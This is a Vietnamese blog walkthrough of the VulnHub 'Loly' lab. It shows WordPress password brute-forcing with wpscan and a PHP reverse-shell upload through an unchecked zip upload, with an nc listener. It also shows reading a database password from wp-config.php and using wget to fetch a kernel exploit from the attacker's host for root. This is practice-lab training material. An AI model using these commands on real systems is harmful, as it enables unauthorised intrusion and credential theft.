<!DOCTYPE html>
<html lang="en-us">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Vulhub - Loly - g03m0n</title><meta name="Description" content="g03m0n"><meta property="og:url" content="https://g03m0n.github.io/posts/vulhub---loly/">
  <meta property="og:site_name" content="g03m0n">
  <meta property="og:title" content="Vulhub - Loly">
  <meta property="og:description" content="Description Link lab tại đâyStep Reconnaissance Đầu tiên ta sử dụng arp-scan để quét các địa chỉ IP có trong dải mạng. Nhận thấy có một IP lạ là 192.168.134.135.
Sử dụng nmap để kiểm tra các dịch vụ đang mở trên IP đó
Có cổng 80 đang mở và đang sử dụng nginx 1.10.3.
Enumeration Tiến hành quét các directory bằng dirb
dirb 192.168.134.135 Ta thu được kết quả trang web này sử dụng Wordpress tại endpoint /wordpress.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2023-08-20T08:29:01+08:00">
    <meta property="article:modified_time" content="2023-08-20T08:29:01+08:00">
    <meta property="article:tag" content="Vulhub">
    <meta property="article:tag" content="Lab">
    <meta property="article:tag" content="Ctf">
    <meta property="og:image" content="https://g03m0n.github.io/images/avatar.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://g03m0n.github.io/images/avatar.png">
  <meta name="twitter:title" content="Vulhub - Loly">
  <meta name="twitter:description" content="Description Link lab tại đâyStep Reconnaissance Đầu tiên ta sử dụng arp-scan để quét các địa chỉ IP có trong dải mạng. Nhận thấy có một IP lạ là 192.168.134.135.
Sử dụng nmap để kiểm tra các dịch vụ đang mở trên IP đó
Có cổng 80 đang mở và đang sử dụng nginx 1.10.3.
Enumeration Tiến hành quét các directory bằng dirb
dirb 192.168.134.135 Ta thu được kết quả trang web này sử dụng Wordpress tại endpoint /wordpress.">
<meta name="application-name" content="g03m0n">
<meta name="apple-mobile-web-app-title" content="g03m0n"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://g03m0n.github.io/posts/vulhub---loly/" /><link rel="next" href="https://g03m0n.github.io/posts/vulhub-mrrobot/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Vulhub - Loly",
        "inLanguage": "en-us",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/g03m0n.github.io\/posts\/vulhub---loly\/"
        },"image": ["https:\/\/g03m0n.github.io\/images\/avatar.png"],"genre": "posts","keywords": "vulhub, lab, ctf","wordcount":  315 ,
        "url": "https:\/\/g03m0n.github.io\/posts\/vulhub---loly\/","datePublished": "2023-08-20T08:29:01+08:00","dateModified": "2023-08-20T08:29:01+08:00","publisher": {
            "@type": "Organization",
            "name": "g03m0n","logo": "https:\/\/g03m0n.github.io\/images\/avatar.png"},"author": {
                "@type": "Person",
                "name": "g03m0n"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="auto" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="g03m0n"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/avatar.png"
        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
        data-sizes="auto"
        alt="/images/avatar.png"
        title="/images/avatar.png" />g03m0n</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"> Posts </a><a class="menu-item" href="/categories/" title="Categories"> Categories </a><a class="menu-item" href="/tags/" title="Tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search" id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="g03m0n"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/avatar.png"
        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
        data-sizes="auto"
        alt="/images/avatar.png"
        title="/images/avatar.png" />g03m0n</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search" id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="Posts">Posts</a><a class="menu-item" href="/categories/" title="Categories">Categories</a><a class="menu-item" href="/tags/" title="Tags">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content always-active" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Vulhub - Loly</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/g03m0n" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>g03m0n</a>
</span>&nbsp;<span class="post-category">included in <a href="/categories/vulhub/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>VulHub</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-08-20">2023-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;315 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#description">Description</a></li>
    <li><a href="#step">Step</a>
      <ul>
        <li><a href="#reconnaissance">Reconnaissance</a></li>
        <li><a href="#enumeration">Enumeration</a></li>
        <li><a href="#exploitation">Exploitation</a></li>
        <li><a href="#privilege-escalation">Privilege Escalation</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="description">Description</h2>
<p>Link lab tại <a href="https://www.vulnhub.com/entry/loly-1,538/" target="_blank" rel="noopener noreffer">đây</a>
</p>
<h2 id="step">Step</h2>
<h3 id="reconnaissance">Reconnaissance</h3>
<p>Đầu tiên ta sử dụng <code>arp-scan</code> để quét các địa chỉ IP có trong dải mạng.
Nhận thấy có một IP lạ là <code>192.168.134.135</code>.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/01604d3d-6aa0-40a3-b0a9-8eaa9a891c57"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/01604d3d-6aa0-40a3-b0a9-8eaa9a891c57, https://github.com/g03m0n/pics/assets/130943529/01604d3d-6aa0-40a3-b0a9-8eaa9a891c57 1.5x, https://github.com/g03m0n/pics/assets/130943529/01604d3d-6aa0-40a3-b0a9-8eaa9a891c57 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/01604d3d-6aa0-40a3-b0a9-8eaa9a891c57"
        title="image" /></p>
<p>Sử dụng <code>nmap</code> để kiểm tra các dịch vụ đang mở trên IP đó</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/605569cb-8af7-47ca-a3c6-4648c22bd7ab"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/605569cb-8af7-47ca-a3c6-4648c22bd7ab, https://github.com/g03m0n/pics/assets/130943529/605569cb-8af7-47ca-a3c6-4648c22bd7ab 1.5x, https://github.com/g03m0n/pics/assets/130943529/605569cb-8af7-47ca-a3c6-4648c22bd7ab 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/605569cb-8af7-47ca-a3c6-4648c22bd7ab"
        title="image" /></p>
<p>Có cổng <code>80</code> đang mở và đang sử dụng <code>nginx 1.10.3</code>.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/158bea40-1692-4c44-827c-ba2547694963"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/158bea40-1692-4c44-827c-ba2547694963, https://github.com/g03m0n/pics/assets/130943529/158bea40-1692-4c44-827c-ba2547694963 1.5x, https://github.com/g03m0n/pics/assets/130943529/158bea40-1692-4c44-827c-ba2547694963 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/158bea40-1692-4c44-827c-ba2547694963"
        title="image" /></p>
<h3 id="enumeration">Enumeration</h3>
<p>Tiến hành quét các <code>directory</code> bằng <code>dirb</code></p>
<pre tabindex="0"><code>dirb 192.168.134.135
</code></pre><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/738a1e31-e335-4975-bca3-91f5e3175625"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/738a1e31-e335-4975-bca3-91f5e3175625, https://github.com/g03m0n/pics/assets/130943529/738a1e31-e335-4975-bca3-91f5e3175625 1.5x, https://github.com/g03m0n/pics/assets/130943529/738a1e31-e335-4975-bca3-91f5e3175625 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/738a1e31-e335-4975-bca3-91f5e3175625"
        title="image" /></p>
<p>Ta thu được kết quả trang web này sử dụng Wordpress tại endpoint <code>/wordpress</code>.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/7d526f65-637b-458d-9fd8-ef40788e1623"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/7d526f65-637b-458d-9fd8-ef40788e1623, https://github.com/g03m0n/pics/assets/130943529/7d526f65-637b-458d-9fd8-ef40788e1623 1.5x, https://github.com/g03m0n/pics/assets/130943529/7d526f65-637b-458d-9fd8-ef40788e1623 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/7d526f65-637b-458d-9fd8-ef40788e1623"
        title="image" /></p>
<p>Giao diện chính của trang:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/78bbf34c-018e-4ff6-976d-96b162bd1a76"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/78bbf34c-018e-4ff6-976d-96b162bd1a76, https://github.com/g03m0n/pics/assets/130943529/78bbf34c-018e-4ff6-976d-96b162bd1a76 1.5x, https://github.com/g03m0n/pics/assets/130943529/78bbf34c-018e-4ff6-976d-96b162bd1a76 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/78bbf34c-018e-4ff6-976d-96b162bd1a76"
        title="image" /></p>
<p>Giao diện <code>login</code>:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/64178c02-5765-4162-8237-36f523c63a6f"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/64178c02-5765-4162-8237-36f523c63a6f, https://github.com/g03m0n/pics/assets/130943529/64178c02-5765-4162-8237-36f523c63a6f 1.5x, https://github.com/g03m0n/pics/assets/130943529/64178c02-5765-4162-8237-36f523c63a6f 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/64178c02-5765-4162-8237-36f523c63a6f"
        title="image" /></p>
<p>Tiến hành <code>brute force</code> <code>username/password</code> bằng cách sử dụng <code>wpscan</code>.
Đầu tiên ta tìm <code>username</code>:</p>
<pre tabindex="0"><code>wpscan -url http://loly.lc/wordpress
</code></pre><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/ca4ed5d5-6c08-43e0-992c-6d4c98cb41b1"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/ca4ed5d5-6c08-43e0-992c-6d4c98cb41b1, https://github.com/g03m0n/pics/assets/130943529/ca4ed5d5-6c08-43e0-992c-6d4c98cb41b1 1.5x, https://github.com/g03m0n/pics/assets/130943529/ca4ed5d5-6c08-43e0-992c-6d4c98cb41b1 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/ca4ed5d5-6c08-43e0-992c-6d4c98cb41b1"
        title="image" /></p>
<p>Ta thu được username là <code>loly</code>.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/47d34f0c-6e9f-4a02-881e-32b5882241ca"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/47d34f0c-6e9f-4a02-881e-32b5882241ca, https://github.com/g03m0n/pics/assets/130943529/47d34f0c-6e9f-4a02-881e-32b5882241ca 1.5x, https://github.com/g03m0n/pics/assets/130943529/47d34f0c-6e9f-4a02-881e-32b5882241ca 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/47d34f0c-6e9f-4a02-881e-32b5882241ca"
        title="image" /></p>
<p><code>Brute force</code> password bằng query:</p>
<pre tabindex="0"><code>wpscan -url http://loly.lc/wordpress -U loly -P /usr/share/wordlists/rockyou.txt
</code></pre><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/da322f22-0411-4785-9e06-f6086e6d2908"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/da322f22-0411-4785-9e06-f6086e6d2908, https://github.com/g03m0n/pics/assets/130943529/da322f22-0411-4785-9e06-f6086e6d2908 1.5x, https://github.com/g03m0n/pics/assets/130943529/da322f22-0411-4785-9e06-f6086e6d2908 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/da322f22-0411-4785-9e06-f6086e6d2908"
        title="image" /></p>
<p>Thu được mật khẩu: <code>fernando</code>
Tiến hành đăng nhập</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/d18ffdcc-63e4-4836-be84-b2a26dc5d5e9"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/d18ffdcc-63e4-4836-be84-b2a26dc5d5e9, https://github.com/g03m0n/pics/assets/130943529/d18ffdcc-63e4-4836-be84-b2a26dc5d5e9 1.5x, https://github.com/g03m0n/pics/assets/130943529/d18ffdcc-63e4-4836-be84-b2a26dc5d5e9 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/d18ffdcc-63e4-4836-be84-b2a26dc5d5e9"
        title="image" /></p>
<h3 id="exploitation">Exploitation</h3>
<p>Đây là giao diện chính của trang web:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/e798e8e0-d403-4fea-b2a0-424f41a3a5ed"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/e798e8e0-d403-4fea-b2a0-424f41a3a5ed, https://github.com/g03m0n/pics/assets/130943529/e798e8e0-d403-4fea-b2a0-424f41a3a5ed 1.5x, https://github.com/g03m0n/pics/assets/130943529/e798e8e0-d403-4fea-b2a0-424f41a3a5ed 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/e798e8e0-d403-4fea-b2a0-424f41a3a5ed"
        title="image" /></p>
<p>Ta có thể thấy trang web sử dụng 1 <code>plugin</code> có tên là <code>AdRotale</code> version 5.8.6.2. Version này cho phép người dùng <code>upload</code> file zip và giải nén mà không có bất kỳ một phương thức kiểm tra nào:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/ee63dcb6-c3f8-46bd-8100-bb889b717a8e"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/ee63dcb6-c3f8-46bd-8100-bb889b717a8e, https://github.com/g03m0n/pics/assets/130943529/ee63dcb6-c3f8-46bd-8100-bb889b717a8e 1.5x, https://github.com/g03m0n/pics/assets/130943529/ee63dcb6-c3f8-46bd-8100-bb889b717a8e 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/ee63dcb6-c3f8-46bd-8100-bb889b717a8e"
        title="image" /></p>
<p>Ta có thể tận dụng lỗ hổng này để upload <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener noreffer">reverse-shell</a>
.
Mở cổng 9001 trên máy attacker bằng query:</p>
<pre tabindex="0"><code>nc -nvlp 9001
</code></pre><p>Bây giờ, truy cập PHP reverse shell bằng cách load lại trang web như hình dưới đây:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/7e9ef54f-fbd1-4400-9785-9449e2fd5edf"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/7e9ef54f-fbd1-4400-9785-9449e2fd5edf, https://github.com/g03m0n/pics/assets/130943529/7e9ef54f-fbd1-4400-9785-9449e2fd5edf 1.5x, https://github.com/g03m0n/pics/assets/130943529/7e9ef54f-fbd1-4400-9785-9449e2fd5edf 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/7e9ef54f-fbd1-4400-9785-9449e2fd5edf"
        title="image" /></p>
<p>Thành công</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/3c775389-0748-4b91-813c-d3cef95c6030"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/3c775389-0748-4b91-813c-d3cef95c6030, https://github.com/g03m0n/pics/assets/130943529/3c775389-0748-4b91-813c-d3cef95c6030 1.5x, https://github.com/g03m0n/pics/assets/130943529/3c775389-0748-4b91-813c-d3cef95c6030 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/3c775389-0748-4b91-813c-d3cef95c6030"
        title="image" /></p>
<p>Có thể nâng cấp shell này python <code>pty</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span></code></pre></div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/053ebc3d-8a64-4091-9237-879908ab4521"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/053ebc3d-8a64-4091-9237-879908ab4521, https://github.com/g03m0n/pics/assets/130943529/053ebc3d-8a64-4091-9237-879908ab4521 1.5x, https://github.com/g03m0n/pics/assets/130943529/053ebc3d-8a64-4091-9237-879908ab4521 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/053ebc3d-8a64-4091-9237-879908ab4521"
        title="image" /></p>
<p>Sau đó thử <code>grep</code> với từ khóa <code>loly</code> ta tìm được mật khẩu DB có trong file <code>wp-config.php</code> là <code>lolyisabeautifulgirl</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/e377ee37-b2b6-4007-87e3-b60919696ce8"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/e377ee37-b2b6-4007-87e3-b60919696ce8, https://github.com/g03m0n/pics/assets/130943529/e377ee37-b2b6-4007-87e3-b60919696ce8 1.5x, https://github.com/g03m0n/pics/assets/130943529/e377ee37-b2b6-4007-87e3-b60919696ce8 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/e377ee37-b2b6-4007-87e3-b60919696ce8"
        title="image" /></p>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>Đầu tiên, ta thử kiểm tra phiên bản <code>kernel</code> của machine</p>
<pre tabindex="0"><code>uname -a
</code></pre><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/36ef4156-f4e1-47ff-a7fb-19d99e1887e3"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/36ef4156-f4e1-47ff-a7fb-19d99e1887e3, https://github.com/g03m0n/pics/assets/130943529/36ef4156-f4e1-47ff-a7fb-19d99e1887e3 1.5x, https://github.com/g03m0n/pics/assets/130943529/36ef4156-f4e1-47ff-a7fb-19d99e1887e3 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/36ef4156-f4e1-47ff-a7fb-19d99e1887e3"
        title="image" /></p>
<p>Đây là một phiên bản khá cũ, thử tìm mã khai thác trên google thì thấy một mã khai thác trên <code>exploit-db</code>:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/54e58d31-d4b5-482b-ab8b-474f950399f1"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/54e58d31-d4b5-482b-ab8b-474f950399f1, https://github.com/g03m0n/pics/assets/130943529/54e58d31-d4b5-482b-ab8b-474f950399f1 1.5x, https://github.com/g03m0n/pics/assets/130943529/54e58d31-d4b5-482b-ab8b-474f950399f1 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/54e58d31-d4b5-482b-ab8b-474f950399f1"
        title="image" /></p>
<p>Ta <code>wget</code> nó về và <code>compile</code>:</p>
<pre tabindex="0"><code>wget http://192.168.134.134:8000/ex.c
gcc ex.c -o ex
chmod 777 ex
</code></pre><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/50cbd30b-c4ba-410b-bcd9-42f14d82cfa4"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/50cbd30b-c4ba-410b-bcd9-42f14d82cfa4, https://github.com/g03m0n/pics/assets/130943529/50cbd30b-c4ba-410b-bcd9-42f14d82cfa4 1.5x, https://github.com/g03m0n/pics/assets/130943529/50cbd30b-c4ba-410b-bcd9-42f14d82cfa4 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/50cbd30b-c4ba-410b-bcd9-42f14d82cfa4"
        title="image" />
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/e32710e2-ee46-4e03-8f82-51f23350a2aa"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/e32710e2-ee46-4e03-8f82-51f23350a2aa, https://github.com/g03m0n/pics/assets/130943529/e32710e2-ee46-4e03-8f82-51f23350a2aa 1.5x, https://github.com/g03m0n/pics/assets/130943529/e32710e2-ee46-4e03-8f82-51f23350a2aa 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/e32710e2-ee46-4e03-8f82-51f23350a2aa"
        title="image" />
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/0614d379-e22f-4b5a-8e72-d2ee3433eab4"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/0614d379-e22f-4b5a-8e72-d2ee3433eab4, https://github.com/g03m0n/pics/assets/130943529/0614d379-e22f-4b5a-8e72-d2ee3433eab4 1.5x, https://github.com/g03m0n/pics/assets/130943529/0614d379-e22f-4b5a-8e72-d2ee3433eab4 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/0614d379-e22f-4b5a-8e72-d2ee3433eab4"
        title="image" /></p>
<p>Thực thi file <code>ex</code> bằng query:</p>
<pre tabindex="0"><code>./ex
</code></pre><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://github.com/g03m0n/pics/assets/130943529/b0c8e664-ee12-498c-b795-40e4d46b0874"
        data-srcset="https://github.com/g03m0n/pics/assets/130943529/b0c8e664-ee12-498c-b795-40e4d46b0874, https://github.com/g03m0n/pics/assets/130943529/b0c8e664-ee12-498c-b795-40e4d46b0874 1.5x, https://github.com/g03m0n/pics/assets/130943529/b0c8e664-ee12-498c-b795-40e4d46b0874 2x"
        data-sizes="auto"
        alt="https://github.com/g03m0n/pics/assets/130943529/b0c8e664-ee12-498c-b795-40e4d46b0874"
        title="image" /></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2023-08-20</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://g03m0n.github.io/posts/vulhub---loly/" data-title="Vulhub - Loly" data-hashtags="vulhub,lab,ctf"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://g03m0n.github.io/posts/vulhub---loly/" data-hashtag="vulhub"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://g03m0n.github.io/posts/vulhub---loly/" data-title="Vulhub - Loly"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/vulhub/">Vulhub</a>,&nbsp;<a href="/tags/lab/">Lab</a>,&nbsp;<a href="/tags/ctf/">Ctf</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav">
            <a href="/posts/vulhub-mrrobot/" class="next" rel="next" title="Vulhub - Mr.Robot">Vulhub - Mr.Robot<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="fb-root" class="comment"></div>
            <div
                class="fb-comments"
                data-href="https://g03m0n.github.io/posts/vulhub---loly/"
                data-width="100%"
                data-numposts="10"
            ></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://developers.facebook.com/docs/plugins/comments/"></a>Facebook</a>.
            </noscript><div id="utterances" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
            </noscript></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.132.2">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
